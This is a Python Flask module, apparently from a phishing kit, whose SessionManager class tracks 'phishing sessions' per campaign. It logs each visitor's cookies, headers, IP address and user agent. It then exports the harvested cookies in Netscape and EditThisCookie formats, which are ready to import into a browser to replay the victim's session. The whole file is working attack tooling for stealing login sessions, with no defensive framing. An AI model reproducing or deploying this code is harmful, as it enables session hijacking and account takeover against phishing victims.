import uuid
import json
from datetime import datetime, timedelta
from flask import session, request
from app import db
from models import SessionLog

class SessionManager:
    """Manage phishing sessions and tracking"""
    
    def __init__(self):
        self.session_timeout = timedelta(hours=24)
    
    def create_session(self):
        """Create a new phishing session"""
        session_id = str(uuid.uuid4())
        session['phish_session_id'] = session_id
        session['created_at'] = datetime.utcnow().isoformat()
        
        return session_id
    
    def get_session_id(self):
        """Get current session ID"""
        return session.get('phish_session_id')
    
    def is_valid_session(self, session_id):
        """Check if session is valid and not expired"""
        if not session_id:
            return False
        
        # Check if session exists in database
        session_log = SessionLog.query.filter_by(session_id=session_id).first()
        if not session_log:
            return False
        
        # Check if session is not expired
        if datetime.utcnow() - session_log.timestamp > self.session_timeout:
            return False
        
        return True
    
    def log_activity(self, campaign_id, activity_type, data=None):
        """Log session activity"""
        session_id = self.get_session_id()
        if not session_id:
            session_id = self.create_session()
        
        session_log = SessionLog(
            campaign_id=campaign_id,
            session_id=session_id,
            cookies=json.dumps(dict(request.cookies)),
            headers=json.dumps(dict(request.headers)),
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent', ''),
            request_url=request.url,
            request_method=request.method
        )
        
        db.session.add(session_log)
        db.session.commit()
        
        return session_log
    
    def get_session_data(self, session_id):
        """Get all data for a session"""
        return SessionLog.query.filter_by(session_id=session_id).all()
    
    def export_session_cookies(self, session_id, format='json'):
        """Export session cookies in various formats"""
        sessions = self.get_session_data(session_id)
        
        all_cookies = {}
        for session in sessions:
            if session.cookies:
                try:
                    cookies = json.loads(session.cookies)
                    all_cookies.update(cookies)
                except:
                    pass
        
        if format == 'json':
            return json.dumps(all_cookies, indent=2)
        elif format == 'netscape':
            # Netscape cookie format
            lines = ['# Netscape HTTP Cookie File']
            for name, value in all_cookies.items():
                lines.append(f".example.com\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
            return '\n'.join(lines)
        elif format == 'editthiscookie':
            # EditThisCookie format
            cookies = []
            for name, value in all_cookies.items():
                cookies.append({
                    'name': name,
                    'value': value,
                    'domain': '.example.com',
                    'path': '/',
                    'secure': False,
                    'httpOnly': False
                })
            return json.dumps(cookies, indent=2)
        
        return all_cookies
